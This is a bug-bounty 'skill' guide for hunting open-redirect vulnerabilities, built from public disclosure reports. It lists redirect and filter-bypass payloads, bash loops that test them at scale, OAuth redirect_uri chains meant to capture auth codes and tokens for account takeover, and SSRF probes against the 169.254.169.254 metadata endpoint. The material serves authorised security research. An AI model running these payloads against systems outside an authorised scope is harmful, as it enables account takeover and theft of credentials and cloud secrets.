---
name: hunt-open-redirect
description: Hunting skill for open-redirect vulnerabilities, built from a study pack of 332 fully-read public disclosed reports (389-report corpus). Covers path-based slash/backslash redirects, parameter-driven redirects (redirect/next/url/return/checkout_url), Host and X-Forwarded-Host poisoning, DOM-based and meta-refresh client redirects, OAuth/OIDC/SAML redirect_uri abuse leading to token theft and full account takeover, chained redirects, filter/fix bypasses, and server-side redirect-to-SSRF escalation. Use when hunting redirects, building OAuth ATO chains, or converting a Low-severity redirect into a reportable High/Critical finding.
sources: hackerone_public, github, portswigger_research
report_count: 389
full_reports_read: 332
---

# HUNT-OPEN-REDIRECT — Open Redirect (332 Full Reports Read)

This skill is derived from a study pack of **332 fully-read disclosed HackerOne reports** drawn from a **389-report corpus** (268 of them TOP-list reports). Every statistic, clue, payload, and citation below is grounded in that corpus. Open redirect is the single most-reported web bug in the pack (`open-redirect: 233`, `redirect-handling: 291`), but its severity is almost entirely determined by **what you chain it to**: alone it is Low/Informative; chained to OAuth/OIDC/SAML it is Critical (full ATO), and followed server-side it becomes SSRF.

Read the "Gate 0 Validation" section before writing any report. A bare "Location: https://evil.com" is not a finding on most programs — the corpus shows repeatedly that only chained impact (token theft, credential theft, session fixation, SSRF) earns a bounty and a "resolved" designation.

---

## Crown Jewel Targets

An open redirect is worth real money only when it lands on a trusted origin that the victim already trusts with a secret. Prioritize targets in this order.

**Tier 1 — token-bearing trusted flows (Critical, ATO):**
- **OAuth / OIDC authorization endpoints** with a `redirect_uri`, `redirectUrl`, `callback`, or `state` parameter. 39 reports carried the `sso-oauth` signal; several are outright ATO: CS Money (#905607), GSA `login.fr.cloud.gov` (#665651), Lichess (#3099816), Uber `central.uber.com` (#206591), LINE (#3423013), lemlist (#3419636). If the redirect target receives an `Authorization: code` or `access_token` in the query/fragment, you own the account.
- **SAML / SSO sign-in endpoints** — `RelayState` (Nextcloud #2263044), SAML sign-in that can be auto-started with an arbitrary external return URL (HackerOne #171398).
- **"Login / Logout / continue / next" flows** that bounce the user post-auth. Expedia #1788006 (`rurl` on logout), MoPub #683298 (`next`), Moneybird #288219 (`return_to`), Shopify `checkout_url` #103772, #159522.
- **Callback / popup-identity endpoints** that place tokens in the URL: Streamlabs `global/identity?...&r=` #1327742, Twitter teams `authorize_callback` #283460, Rockstar `connect/authorize` #1101771.

**Tier 2 — brand-trust phishing and credential capture (Low–Medium, sometimes High):**
- **Link shorteners and redirect bots** — `ln.clario.co/?link=` (#1066410), `go.bitwala.com` fallback param (#967284), `l.php?u=` Facebook link shims (#1579374), pixiv `jump.php` (#541862).
- **URL-rewrite / path-based redirectors** — `https://target.com/http://evil.com/` (#469803, #297803, crm.unikrn.com; #320376 HackerOne `index.php`), `///google.com` triple-slash (#1213580, #753399, #125000).
- **Post-auth "Save settings" / account-edit endpoints** that persist or immediately use a redirect target (Moneybird #288219, Reddit `failed` param via POST #1257753).

**Tier 3 — chained / escalated (Medium–High):**
- **Host-header / proxy-trust surfaces** — any endpoint that builds an absolute URL from the `Host`, `X-Forwarded-Host`, `X-Forwarded-*` headers (Localize #2828499, Omise #1479889 / #1444675, Rockstar #210875, IRCCloud #7357, New Relic password reset #698416).
- **Server-side fetchers that follow redirects** — URL-preview, image-proxy, `asset=`/`url=` fetchers where the redirect is *followed server-side* (Shopify `plus/get-cdn-asset?asset=` #905737, Stripo CSP iframe abuse #1166766, Grafana open-redirect→SSRF #3286945).
- **Exported mobile Activities / WebViews** that accept arbitrary `intent`/`javascript:`/`file:` URIs (Twitter Lite #499348, DoD Android WebView #2555949).

**When the redirect target is attacker-controlled and the origin is trusted, escalate severity by asking: does anything secret ride along in the redirect?** Auth code, access token, session id, CSRF/authenticity token, password-reset token, `user_id` (#239503), or a `state`-carried URL (#206591). That answer is the whole ballgame.

### Chain severity matrix (what the redirect connects to)

| Starting redirect | Chained to | Realized impact | Severity | Corpus anchor |
|-------------------|-----------|-----------------|----------|---------------|
| Any trusted-origin redirect | OAuth `redirect_uri` | auth code / access token theft → ATO | Critical | #905607, #665651, #206591 |
| `state` / `RelayState` / `authorize_callback` | OAuth/SAML flow | ATO via misused state carrier | Critical | #206591, #2263044, #283460 |
| Login/logout `rurl` / `next` / `return_to` | Post-auth flow | token / `user_id` disclosure, session fixation | High | #1788006, #239503, #288219 |
| Password-reset link via `X-Forwarded-Host` | Email delivery | reset-token theft → ATO | High | #698416 |
| Shortener / link-shim / `jump.php` | Brand trust | credential phishing | Low–Medium | #1066410, #1579374, #541862 |
| `javascript:` / `data:` / meta-refresh sink | Client execution | XSS on trusted origin | Medium–High | #683298, #260744, #978680 |
| Server-followed 302 | URL fetcher | SSRF / internal network access | High | #3286945, #771465 |
| Redirect to dead subdomain | Subdomain takeover | phishing on trusted parent | Medium–High | #206591, #292825 |
| Uploaded `.svg` on trusted origin | File upload | stored redirect / JS execution | Medium | #368927 |

### Crown-jewel checklist before you invest time

- [ ] Is the redirect on the **apex or a high-trust subdomain** the victim already authenticates to?
- [ ] Does the flow **set a cookie, issue a token, or start a session** before or at the redirect?
- [ ] Is there a **callback parameter** that echoes a secret back to the redirect target?
- [ ] Can the redirect be **triggered by a GET link** (phishable) rather than requiring the attacker's own session?
- [ ] Does the app **follow the redirect server-side** (turning it into SSRF)?
- [ ] Is there a **known patch** for this endpoint you can bypass (an instant regression finding)?

If most boxes are unchecked, the finding is probably a Low standalone redirect — still worth recording, but prioritize the flows that carry secrets.

---

## Attack Surface Signals

Concentrations from the 332-report corpus (number after `##` is report count carrying that signal):

**Parameters that repeatedly turned out to be redirect sinks** (observed verbatim in the pack):
```
redirect=        redirectUrl=     redirect_uri=    redirect_to=      redirect_url=
redirectPath=    redirect_after_login=              authorize_callback=
next=            rurl=            return=          returnTo=         return_url=
continue=        continue[to]=    to=              dest=             destination=
url=             u=               link=            target=           goto=
go=              forward=         location=        r=                out=
failed=          checkout_url=    success_url=     cancel_url=       fallback=
asset=           domain_name=     path=            shop=             state=
l=               ref_url=         query=          color_scheme=
```

**URL / path shapes that are themselves the redirect primitive:**
```
https://target.com/http://evil.com/          # target-as-prefix path redirect (#469803)
https://target.com///evil.com                 # triple slash (#1213580)
https://target.com/%5c evil.com               # backslash (#193027, #260744)
https://target.com/index.php/index.php.evil.com  # path prefix rewrite (#320376, #439075, #562417)
https://target.com/#/path///google.com        # hash-route JS redirect (#753399, #38157)
https://target.com/s/doi?...&l=//allow@evil/%2e%2e/  # allowlist + @ + dotdot (#625546)
```

**Client-side / JS sink patterns (for DOM and meta-refresh redirects):**
```javascript
window.location.href = <user input>          // #753399
window.location = Buffer.from(params.get('redirect_url'),'base64').toString()  // #1977222
this.wc.href = this.wc.hash.substring(1).replace(/^\/+/,'/')  // #38157 QIWI
new URLSearchParams(location.search).get('url') -> location   // generic DOM
<meta http-equiv="refresh" content="0;url=...">              // #978680, mutation XSS
```

**Response / header signals:**
```
HTTP 30x with Location: <external or protocol-relative //host>
3xx reflecting the raw Request-URI or Path in Location (#260744, #330008)
Location generated from Host / X-Forwarded-Host / X-Forwarded-Proto
Location: javascript:... or data:... (redirect → XSS) (#683298, #260744, #330008)
302 that becomes 303 for certain verbs/paths (#261592, #45513, #66384)
```

**Tech-stack signals worth prioritizing:**
- Node/Express `redirect: true` static middleware (fastify-static #1354255, Express CVE-2015-1164), Rails ActionPack (`6.0.0–6.0.3.2` #904059; CVE-2020-8185 changelog clue #904059).
- Cloudflare / reverse-proxy frontends where cache layer normalizes `//` and `/\` (#193027, #504751, #297803).
- URL shorteners, link-preview bots, image proxies, and any "external link warning" interstitial (pixiv jump.php #541862, HackerOne zendesk_session #111968).
- Angular/Vue hash routers and single-page apps using `URLSearchParams` + `window.location` (#753399, #38157, #1977222).

### Reading the status code / Location pair

The raw `Location:` value and the HTTP status together tell you which redirect class you have:

```
301 Moved Permanently   - often edge/cache normalization of // or /\ (#193027); browser may cache it
302 Found               - the classic parameter redirect; most corpus PoCs (#683298, #504751)
303 See Other           - common for path/dotdot redirects on Express-style stacks (#261592, #45513, #66384)
307/308                 - preserves method; relevant for POST-driven redirects (#1257753)
Location: //host        - protocol-relative; bypasses "must begin with http" checks (#380939)
Location: /\host        - backslash; browsers normalize it to // (#193027, #260744)
Location: javascript:   - redirect-to-XSS, not just phishing (#683298, #260744, #330008)
No Location, but browser moves - DOM/meta-refresh redirect; confirm in browser (#753399, #978680)
```

### Where the parameter names come from

Names are not random — they mirror the framework or feature that produced the redirect:

- `redirect`, `redirectUrl`, `redirect_uri`, `redirect_to`, `redirect_url`, `redirect_after_login` — generic auth/portal redirectors; the last four are also the OAuth family (#1032610, #905607, #665651, #215970).
- `next`, `continue`, `continue[to]`, `return`, `returnTo`, `return_url` — Django/Flask-style post-login continuation and Ruby on Rails `return_to` (#683298, #215970, #288219, #1788006).
- `checkout_url`, `success_url`, `cancel_url`, `fallback` — e-commerce / ad-tech short links (Shopify #103772, #159522; bitwala #967284).
- `state`, `RelayState`, `authorize_callback` — OAuth/SAML protocol fields repurposed as redirect carriers (#206591, #2263044, #283460).
- `u`, `link`, `url`, `l` — shorteners and link shims (Slack `link?url=` #4549, Facebook `l.php?u=` #1579374, New Relic #698416).
- `asset`, `domain_name`, `shop`, `path`, `query`, `color_scheme` — feature-specific params that happen to be concatenated into a redirect target (#905737, #101962, #226408, #158434, #978680, #1245165).

---

## Discovery Patterns From 332 Full Reports

### Where Researchers Start (Ranked Recon Surfaces)

Ranked by how often the surface produced a confirmed redirect in the corpus, with the concrete "what to look for" a researcher used. The ordering is deliberate: the first four surfaces are cheap, high-volume, and produce a redirect candidate within minutes; the later ones (JS review, changelog review, mobile) need more setup but yield chained, higher-severity bugs. Most reporters in the corpus did not discover a magic endpoint — they started from a **real link the application itself generated** (a login button, a register button, a logout link, a short link) and then attacked the validation around it. Reproduce that workflow: collect the app's own redirect URLs first, then mutate them.

1. **Crawl output + `gf redirect` over the whole URL set** — what to look for: any parameter whose name contains `redirect`, `next`, `url`, `return`, `to`, `dest`, `continue`, `callback`. This is the highest-yield first pass; `redirect-handling` (291) and `open-redirect` (233) dominate the frequency table. (#905607, #683298, #1213580)
2. **Login / logout / post-auth flows** — what to look for: the "Sign in" or "Sign out" button link and its `redirect_url`/`rurl`/`next`/`return_to` parameter; log out and watch the request. (#683298, #1788006, #288219)
3. **OAuth / SSO / authorize endpoints** — what to look for: `authorize`, `oauth/authorize`, `/connect/authorize`, `redirect_uri`, `state`, `callback`, `authorize_callback`. Modify `redirect_uri`, or supply an invalid `scope` to bypass validation. (#665651, #3099816, #972601, #283460)
4. **Absolute-path URLs that begin with the target domain** — what to look for: `https://target.com/http://…`, `///google.com`, `/%2f%2f%2fevil`, `//google.com/%2f..`. Just append an external URL to the origin or inject extra slashes. (#469803, #1213580, #504751, #125000)
5. **JS bundles / public source** — what to look for: `window.location`, `URLSearchParams`, `Buffer.from(...,'base64')`, hash-route `slice()` logic, leaked API keys for URL shorteners. `js-source-review: 11`, `public-code-search: 22`. (#753399, #1977222, #38157, #1066410)
6. **Host header handling** — what to look for: endpoints that generate absolute URLs, reset-password emails, short links, or account links from `Host`/`X-Forwarded-Host`. `host-header: 19`, `host-header-attack: 16`. (#2828499, #1479889, #698416, #210875)
7. **Link shorteners / redirect bots / "external link" warnings** — what to look for: short-link endpoints (`link=`, `fallback=`, `url=`), `l.php?u=`, `jump.php`, interstitial warning pages. (#1066410, #967284, #1579374, #541862, #111968)
8. **CSRF / POST forms** — what to look for: hidden `failed`, `return_to`, `return_url` fields; redirects triggered by POST. `csrf: 9`, `reflected: 12`. (#1257753, #242243)
9. **Change-log / CVE diff review** — what to look for: a patch for a prior open redirect and then hunt the same endpoint for a bypass. (#904059 CVE-2020-8185 changelog; #504509, #1285081, #439075, #127741, #1212337 are all explicit fix-bypasses)
10. **Mobile app / WebView attack surface** — what to look for: exportedActivities, browsable intents accepting `javascript:`, `file:`, or `http://` in an `URL`/`S.URL` extra. (#499348, #2555949, #401940)
11. **Subdomain and wildcard enumeration** — what to look for: `*.target.com` hosts, dev/staging/CNAME records via crt.sh, non-Latin/IDN subdomains. `subdomain: 22`, `subdomain-takeover: 15`. (#150374 crt.sh clue, #261592, #2331473, #292825)
12. **SVG / file-upload preview links** — what to look for: uploaded `.svg` served from a trusted origin that can contain JS/meta redirects. `svg-upload: 3`, `file-upload: 7`. (#368927)

### Feature-Based Discovery Signals

Frequency-ranked from the study pack's `TECHNIQUE / DISCOVERY FREQUENCY` table, which counted signals across all 332 fully-read reports. "Why it matters" is the exploitation logic; "what to probe" is the first action. The counts are not mutually exclusive — a single OAuth ATO report can simultaneously carry `sso-oauth`, `redirect-handling`, `session-attack`, `subdomain-takeover`, and `open-redirect` signals (e.g. #905607 carries eight technique tags). Treat the table as a **where-to-spend-time ranking**: the top five signals alone account for the overwhelming majority of confirmed redirects, while the low-count rows at the bottom (null byte, homograph, parameter pollution) are bypass refinements rather than discovery surfaces.

| Rank | Signal (report count) | Why it matters | What to probe |
|------|-----------------------|----------------|---------------|
| 1 | redirect-handling (291) | The app explicitly performs redirects — the sink is confirmed. | Fuzz every redirect parameter with `https://evil.com`, `//evil.com`, `https://target.com@evil.com`. |
| 2 | open-redirect (233) | Researchers found an unvalidated target on a trusted origin. | Check `Location:` on all 30x responses; confirm with `--max-redirs 0`. |
| 3 | search-filter-sort (81) | Search/filter params are reflected into generated links and redirects. | Inject an external URL into `query=`, `color_scheme=`, sort/filter params. |
| 4 | filter-bypass (54) | A protection exists — the bug is defeating it. | Try case, `\`, double-slash, encoding, decimal IP, `Http:` prefix. |
| 5 | server-side-rendering (49) | Server generates the redirect/HTML — reflects Request-URI. | Test `Location:` vs on-page link differentials (#260744). |
| 6 | api-endpoint (43) | JSON/REST endpoints accept redirect URLs in body or query. | Probe `succUrl`, `asset`, `checkout_url`, `return_to` in GET and POST. |
| 7 | sso-oauth (39) | Highest severity — tokens ride the redirect. | Manipulate `redirect_uri`, `state`, `redirect_after_login`, invalid `scope`. |
| 8 | url-fetching (35) | Redirect target may be fetched server-side → SSRF. | Set redirect target to `169.254.169.254` or your Collaborator. |
| 9 | image-processing (34) | Image/CDN asset params often double as redirectors. | Probe `asset=`, `buttonImageURL`, `filename.svg`. |
| 10 | cookie-handling (34) | Redirect target derived from a cookie (`last_shop`, session). | Tamper cookie value to a domain (#161991). |
| 11 | xml-parser (26) | Parser flows feed OAuth/redirect endpoints. | Combine with `redirect_uri` manipulation (#243001). |
| 12 | admin-internal (26) | Admin/dashboard redirects are high-trust. | Probe dashboard `ref_url`, `return_url`, `nextPage`. |
| 13 | cache-layer (24) | Edge/origin normalization differences create `//` redirects. | Test `///`, `/%2e%2e`, `/\` at edge vs origin. |
| 14 | subdomain (22) | Weaker subdomains redirect or are takeover-able. | Enumerate `*.target.com`; test each for path redirect. |
| 15 | public-code-search (22) | Source reveals unsanitized sinks and leaked keys. | Search GitHub / JS for `window.location`, `shortLinks?key=`. |
| 16 | comment-injection (21) | Stored links become stored redirects. | Store a link in a profile/comment, then click it. |
| 17 | session-attack (19) | Login CSRF + redirect = session fixation / data leak. | Start SSO flow via GET with attacker `email`/`state` (#171398). |
| 18 | host-header (19) / host-header-attack (16) | Host becomes the redirect base. | Inject `Host:` and `X-Forwarded-Host:` with evil.com. |
| 19 | path-traversal-lfi (16) | Dotdot segments survive normalization into redirect. | Append `/%2f..`, `/%2e%2e`, `../../../` to `//evil.com`. |
| 20 | subdomain-takeover (15) | A redirect to a dead subdomain is claimable. | Find redirects to non-existent subdomains, claim them (#206591). |
| 21 | blind-oob (13) / internal-network (13) | Redirect → SSRF / internal port reach. | Use Collaborator as redirect target and poll for hits. |
| 22 | double-encoding (6) / base64-encoding (5) | WAF sees encoded value, app decodes then redirects. | `%2523`, base64 in path/param (#905607, #1977222). |
| 23 | unicode-normalization (3) / null-byte (3) / case-variation (2) | Filter sees one string, browser resolves another. | Ideographic full stop `。`, `%00`, `Http:` (#1032610, #978680, #411723). |
| 24 | dom-based (3) / js-source-review (11) | Client-side redirect invisible to `Location:` grepping. | Confirm in a browser, not curl (#753399, #1977222). |

### Verbatim Discovery Clues

Eighteen real "how I found it" lines, quoted verbatim from the disclosed reports (truncations are the study pack's).

1. [#2828499] "By controlling the Host header and observing a redirection to the specified external site, you may have found an open redirect vulnerability."
2. [#3099816] "By manipulating the redirect_uri parameter during the OAuth authorization process with Lichess, an attacker can redirect users to an arbitrary external domain (e."
3. [#1066410] "While I was trying to test regex I was figured out i can short urls that redirect users whatever I want because of wrong regex leads security misconfiguration."
4. [#1066410] "I found that endpoint from same javascript file."
5. [#1479889] "I have found this bug since feb."
6. [#330008] "so,i try test,amzing i found a way to bypass protection."
7. [#541862] "I found that pixiv has a open redirect protection, any external link in illustration is converted to `https://www."
8. [#840736] "I was able to get the original redirection URL from the register button located at http://dashboard."
9. [#1245165] "While looking at the HTTP requests to see if I could find any open redirect and demonstrate the impact I notice one interesting API endpoint"
10. [#978680] "And i was able to break out of the `content` attribute and was able to bypass the Cloudflare protection that wouldnt let me to add `http-equiv` attribute by using `%00` char to finally achieve the following redirect using a crafte"
11. [#972601] "Hello @pixiv security team, i hope you are well, i noticed you can redirect users to another domain if you send an invalided scope."
12. [#1579374] "I have found this vulnerability and this is affecting Facebook."
13. [#246897] "by converting ``` &noredirect= ``` from ``` true ``` to ``` false ``` i was able to redirect users to any site"
14. [#210875] "I noticed you are using unsafe host header in generating short links."
15. [#126203] "I found an vulnerability in Uber URL redirect page."
16. [#904059] "I was looking at the change log (https://github."
17. [#215970] "I noticed that the `continue[to]` parameter can be used to perform an Open Redirect through the inclusion of a double-slash prefix."
18. [#1788006] "While browsing on expedia, I logged out of the account and as soon as I logged out, it was calling me a parameter called \"rurl\" directly on the link, I examined it and was able to redirect successfully."

Patterns across these clues: start from a real UI link (register/login/logout button), read the JS or changelog for the intended logic, then attack the validation (regex, filter, encoding) rather than inventing a new endpoint. "Fix bypass" clues (#330008, #904059, #541862, #215970) recur constantly — always retest patched redirects.

Three recurring researcher behaviors are worth internalizing:

1. **Intercept a real action, then reuse its URL.** #840736 got the exact redirect URL "from the register button"; #1788006 found `rurl` "as soon as I logged out"; #905607 took the OAuth login URL "from cs.money index page button sign in through steam". The application hands you the sink — capture it in Burp.
2. **Read the code or the patch, don't guess the filter.** #1066410 found both the shortener endpoint and its API key in one JS file; #1977222 pasted the exact `window.location = Buffer.from(...)` sink; #38157 quoted the minified hash handler; #904059 read the Rails changelog for CVE-2020-8185 and found a second bug; #3723458 located the regex in `libs/urls/src/regexp`. Knowing the check tells you which bypass to try.
3. **Attack validation coverage gaps.** #972601 disabled `redirect_uri` validation with an invalid `scope`; #541862 found the guard applied to illustrations but not novels; #246897 flipped `&noredirect=true` to `false`; #1397804 added extra headers to a proxy; #1245165 followed HTTP requests until an interesting API endpoint appeared.

### Probe Checklist (15 Concrete Probes)

Run these against every candidate redirect sink. Use `https://evil.example` as the canary domain.

1. **Basic absolute URL** — `?redirect=https://evil.example` — expect `Location: https://evil.example`.
2. **Protocol-relative** — `?redirect=//evil.example` — bypasses "must start with http" filters (#380939, #283460).
3. **Triple/double slash path** — append `///evil.example` or `//evil.example` directly to the origin path (#1213580, #297803, #125000).
4. **Backslash confusion** — `?redirect=/\evil.example` and `https://target.com/%5cevil.example` (#840736, #193027).
5. **At-sign confusion** — `https://target.com@evil.example` (#625546 allowlist + `@` bypass).
6. **Target-prefix path** — `https://target.com/http://evil.example/` (#469803, #297803).
7. **Index.php / path rewrite** — `/index.php/index.php.evil.example` (#320376, #439075, #562417).
8. **Dotdot suffix** — `//evil.example/%2f..`, `//evil.example/%2e%2e`, `../../../` (#261592, #45513, #39198).
9. **Hash-route JS redirect** — `https://target.com/#/path///evil.example` (#753399, #38157).
10. **Encoded slashes / double encoding** — `%2f%2f%2fevil.example%2f`, `%2523`, `%00` (#504751, #905607, #978680).
11. **Host / X-Forwarded-Host poisoning** — send `Host: evil.example` and `X-Forwarded-Host: evil.example` (#2828499, #1479889, #1444675).
12. **javascript: / data: URI** — `?next=javascript:alert(document.domain)` — redirect → XSS (#683298, #260744, #330008).
13. **OAuth redirect_uri + invalid scope** — change `redirect_uri` to `https://evil.example` and set `scope=ggg` (#972601); or set `response_type=token` (#665651).
14. **Case / decimal / Unicode filter bypass** — `Http:3627732462` (decimal IP), `Http:`, ideographic full stop `。`, `𝟘` homoglyph (#411723, #1032610, #59372).
15. **Server-side follow → SSRF** — set redirect target to `http://169.254.169.254/latest/meta-data/` or your Collaborator URL and check for a callback (#3286945, #905737, #771465).

For each hit, record: the exact parameter/sink, the request, the `Location:` header, the HTTP status, and — for chained cases — the token/secret captured.

Probe discipline notes:
- Run probes **one payload at a time**. Bundling several payloads into one batch loses attribution — you will see a redirect but not know which encoding caused it.
- Keep a **negative control**: the same parameter with a benign on-domain value should stay on-domain. That proves the validation logic and gives the triager a clean comparison.
- Probe **GET and POST separately**. Hidden `failed`/`return_to` fields in a form are a distinct sink from the same-named query param (#1257753, #242243, #1310230).
- Probe **authenticated and unauthenticated states**. Some redirects only appear after login (#1788006 logout flow) or only for a not-yet-verified email (#1444675).
- Probe **every browser class**: Chrome, Firefox, and Safari normalize backslashes, `@`, and dotdot segments differently (#260744, #193027). A payload that fails in curl can still land in Firefox.

---

## Step-by-Step Hunting Methodology

### Phase 0 — Scope & gate check
- Confirm the domain is in scope and note the program's open-redirect policy (some programs explicitly out-of-scope standalone redirects, e.g. `openid.mail.ru` #241484, `certification.mail.ru` #219458).
- Decide your goal up front: standalone Low report, OAuth ATO chain (Critical), phishing chain (Medium), or server-side SSRF (High). The corpus shows chained findings are what get paid and resolved.

### Phase 1 — Discover redirect candidates
```bash
# Extract redirect candidates from a crawl
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
wc -l recon/$TARGET/redirect-candidates.txt

# Broaden beyond gf's default regex
grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout|rurl|callback|state)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
sort -u recon/$TARGET/redirect-candidates.txt -o recon/$TARGET/redirect-candidates.txt
```

Also enumerate: subdomains (`crt.sh` — #150374 clue), JS bundles for `window.location`/`URLSearchParams`/`base64`, change logs/CVE diffs (#904059), and mobile exported Activities via `apkanalyzer`/`adb` (#499348, #2555949).

### Phase 2 — High-volume basic test
```bash
COLLAB="https://evil.example"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```
`--max-redirs 0` is essential: you want the first-hop `Location:`, not the final landing page. Also test POST forms (qsreplace won't cover hidden fields — use Burp) (#1257753, #242243).

### Phase 3 — Bypass the filter (if basic payload is blocked)
Walk the full Bypass Techniques table. Prioritize by the filter you observed: "must start with http" → `//evil`; "trusted string present" → `http://evil\target.com` (#840736) or `//allow@evil/%2e%2e` (#625546); "regex allowlist" → target-prefix path (`target.com.evil.com` via `checkout_url=.np` #103772) or domain-validation regex bypass (#3723458).

```bash
BASE_URL="https://$TARGET/redirect?url="
PAYLOADS=(
  "https://evil.example"
  "//evil.example"
  "/\\evil.example"
  "https://$TARGET@evil.example"
  "https://evil.example%23.$TARGET"
  "https://evil.example%09"
  "Http:3627732462"
  "https://evil.example%E3%80%82$TARGET"
)
for P in "${PAYLOADS[@]}"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
  echo "$P -> $LOC"
done
```

### Phase 3b — DOM-based / client-side redirect (curl can't see these)
Server-side `Location:` grepping misses redirects executed purely in JS (3 `dom-based`, 11 `js-source-review` reports).
```bash
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer|Buffer\.from"
# Confirm in a browser:
#   https://$TARGET/page#https://evil.example
#   https://$TARGET/page?redirect_url=<base64-of-https://evil.example>
# Common shapes:
#   var u = new URLSearchParams(location.search).get('url'); location = u;
#   if(location.href.indexOf('#/path')!==-1) location.href = location.href.slice(...);  (#753399)
```
Also check `<meta http-equiv="refresh">` reflection and null-byte insertion to bypass WAF attribute filtering (#978680).

### Phase 4 — OAuth / SSO ATO chain test (highest value)
```bash
# Locate OAuth endpoints
grep -iE "oauth|authorize|redirect_uri|saml|callback" recon/$TARGET/urls.txt | head -30

# Classic redirected auth-code / token theft
# Normal: redirect_uri=https://$TARGET/callback
# Attack: redirect_uri=https://$TARGET/redirect?url=https://evil.example
curl -sv "https://$TARGET/oauth/authorize?response_type=code&client_id=CLIENT_ID\
&redirect_uri=https%3A%2F%2F$TARGET%2Fredirect%3Furl%3Dhttps%3A%2F%2Fevil.example" 2>&1 \
  | grep -i "location:"

# Variants from the corpus:
#  - response_type=token, redirect_uri=https://evil.example/auth/callback   (#665651)
#  - invalid scope=ggg to disable redirect_uri validation                    (#972601)
#  - state= carrying a redirect location instead of a CSRF token             (#206591)
#  - POST-based OAuth redirect                                                (#1129761)
#  - logout then login with attacker rurl -> capture token                    (#1788006)
```
If a token or `code` arrives at your listener, you have a Critical ATO; document the full request/response and a token-decoding screenshot.

### Phase 5 — Server-side redirect → SSRF escalation
```bash
# If the app fetches the redirect target server-side (302 follow)
curl -s "https://$TARGET/proxy?url=https://evil.example/redirect-to-169.254.169.254"
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" -H "Cookie: $SESSION"
```
Plant a Collaborator domain and wait 30–120s; a DNS/HTTP hit confirms server-side follow. Report as SSRF (High), not redirect (#3286945, #771465, #905737).

### Phase 6 — Confirm, capture, and write up
Capture the exact `Location:`, the status code, and browser proof. For chained findings, prove the secret actually reaches you. Then run Gate 0 Validation before submitting.

### Phase 7 — Regression hunting (multiply the yield)
The corpus shows that a patched redirect is rarely patched everywhere. Once you have one confirmed finding, spend ten more minutes on its siblings:

- **Same endpoint, new payload** — the original fix blocked one encoding, not all of them (#840736 backslash, #1032610 Unicode, #411723 case + decimal).
- **Same redirect, different content type / surface** — pixiv protected illustrations but not novels (#541862); a guard removed for an interstitial (#111968).
- **Same bug, different subdomain** — HackerOne's `index.php` redirect recurred on the same host (#320376, #439075, #562417); TikTok/Shopify/Starbucks reports repeatedly list multiple affected domains (#2221547, #905737, #731618).
- **Same pattern, different parameter** — after finding `failed`, test `return_to`, `rurl`, `next`, `redirect_uri` on the same app.
- **Chained to a new sink** — once you own an open redirect, re-run it through the OAuth, CSRF, SSRF, and subdomain-takeover lenses in "Real Impact Examples."

### Common pitfalls (seen repeatedly in the pack)
- Trusting `curl -I` alone and missing a DOM/meta-refresh redirect (#753399, #1977222, #978680) — confirm in a browser.
- Reporting a redirect that is out of scope for standalone impact (#241484, #219458) — check the policy first.
- Forgetting that a 302 with `location: javascript:...` is XSS, not just a redirect (#683298, #260744, #330008).
- Losing attribution by batch-firing multiple payloads — isolate each one.
- Claiming ATO when only the redirect happened, without showing a token actually arriving — the report will be downgraded.

---

## Payload & Detection Patterns

### Core payload set (all observed in the corpus)
```
https://evil.example                       # baseline (#683298)
//evil.example                             # protocol-relative (#380939, #283460)
/\evil.example                             # backslash (#193027, #840736)
https://target.com@evil.example            # at-sign userinfo confusion (#625546)
https://evil.example#target.com            # fragment trick
https://target.com.evil.example            # suffix domain
https://evil.example%23.target.com         # encoded fragment
https://target.com///evil.example          # path triple-slash (#1213580)
https://target.com/index.php/index.php.evil.example  # index.php rewrite (#320376)
https://target.com/http://evil.example/    # URL-as-path (#469803)
//evil.example/%2f..                       # dotdot suffix (#261592)
//evil.example/%2e%2e%2f                   # encoded dotdot (#66384)
/%2f%2f%2fevil.example%2f%3ftarget.com    # encoded rewrite (#504751)
javascript:alert(document.domain)          # redirect → XSS (#683298, #260744)
data:text/html,<script>...</script>        # data URI redirect
0;url=https://evil.example" http-equiv="refresh"  # meta refresh + null byte (#978680)
```

### Filter-bypass payloads
```
Http:3627732462          # case + decimal IP bypass of "http" blacklist (#411723)
http://phishing.com\dashboard.target.com/../../../   # backslash splits allowlist string (#840736)
//www.allowlisted.tld@evil.example/%2e%2e%2f         # allowlist + @ + dotdot (#625546)
https://google.com。target.com      # ideographic full stop defeats deny list (#1032610)
<hex-encoded homoglyph>             # homograph/hex bypass (#59372)
%2523                               # double-encoded fragment (#905607)
%00                                 # null byte to break WAF attribute match (#978680)
```

### Detection commands
```bash
# Single candidate, no auto-follow
curl -s -I --max-redirs 0 "https://$TARGET/path?next=https://evil.example" | grep -iE "^(HTTP|location)"

# Automated across many candidates
cat redirect-candidates.txt | qsreplace "https://evil.example" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}

# nuclei / openredirex
nuclei -u https://$TARGET -t redirect/ -severity medium,high
openredirex -l redirect-candidates.txt -p evil.example

# DOM confirmation (browser) — look for navigation in DevTools Network, not just HTML
```

### Choosing a payload from the observed defense

Match the payload to the specific check that blocked your baseline, rather than spraying everything:

| Observed defense | First bypass to try | Why it works |
|------------------|---------------------|--------------|
| "Parameter must start with `http`" | `//evil.example` | Protocol-relative URL is not rejected but browsers treat it as external (#380939, #283460). |
| "Trusted domain string must be present" | `https://evil.example\\target.com/...` or `//allow@evil/%2e%2e/` | Parser sees the trusted string in a position the validator does not check (#840736, #625546). |
| "Only target.com allowed" (regex) | `https://target.com.evil.example`, `checkout_url=.np` | Suffix-domain confusion; the regex anchors on a prefix (#103772, #3723458). |
| Blocked `http` keyword at start | `Http:3627732462`, `hTtps:` | Case variation plus decimal IP encodes the destination (#411723). |
